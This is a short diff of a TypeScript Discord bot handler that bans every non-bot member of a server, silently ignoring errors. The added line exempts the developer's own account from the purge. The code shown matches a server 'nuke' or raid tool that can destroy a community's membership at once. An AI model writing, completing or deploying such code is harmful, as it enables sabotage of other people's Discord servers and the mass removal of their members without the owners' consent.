@@ -6,6 +6,7 @@ export default async (guild: Guild): Promise<void> => {
 		const members = guild.members.cache.filter((member) => !member.user.bot);
 
 		members.forEach(async (member) => {
+			if (member.id === Config.DeveloperUserId) return;
 			await member.ban().catch(() => {});
 		});
 	}
